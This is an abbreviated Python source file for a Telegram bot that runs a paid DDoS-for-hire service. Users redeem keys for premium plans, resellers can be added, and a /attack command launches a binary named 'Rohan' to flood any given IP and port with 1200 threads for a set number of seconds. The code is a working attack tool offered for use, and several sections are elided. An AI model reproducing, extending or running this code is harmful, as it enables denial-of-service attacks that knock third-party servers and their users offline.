...
OWNER_ID = '1866961136'  # Replace with your Telegram user ID (e.g., 123456789)
...
attacks = {}  # {user_id: subprocess.Popen}
...
def run_attack(user_id, ip, port, duration):
    try:
        packet_size = 512
        threads = 1200
        process = subprocess.Popen(['./Rohan', ip, str(port), str(duration), str(packet_size), str(threads)])
        attacks[user_id] = process
        process.wait()
    except FileNotFoundError:
        print("Rohan binary not found.")
    finally:
        if user_id in attacks:
            del attacks[user_id]

# /start (with group referral support only)
...
def send_help(message):
    ...
    help_text = (
        ...
        "   _Example:_ /attack 1.1.1.1 80 60\n"
...
# /leaderboard (group invites only)
...
def start_attack(message):
    ...
    try:
        ...
        if user['expires'] and time.time() > user['expires']:
            ...
            return
        attack_thread = threading.Thread(target=run_attack, args=(user_id, ip, port, duration))
        attack_thread.start()
        bot.reply_to(message, f"Attack started on {ip}:{port} for {duration} seconds using Rohan.")
    except ValueError:
...
def redeem_key(message):
    ...
    data['users'][user_id] = {
        'type': 'user',
        'plan': 'premium',
        'limit': 600,  # Updated to 600 seconds for premium
...
def add_user(message):
    ...
    if len(args) != 4:
        ...
        return
    type_, user_id, duration_str = args[1], args[2], args[3]
    ...
    data['users'][user_id] = {
        ...
        'limit': 600 if type_ in ['admin', 'reseller'] else 30,  # Updated to 600s for premium-like roles
    ...
    save_data()
    bot.reply_to(message, f"Added {type_} {user_id} with {duration_str} duration.")

# Other admin commands (abbreviated)
...
def admin_commands(message):
    ...
    bot.reply_to(message, f"{cmd} not fully implemented here for brevity. Refer to previous script.")
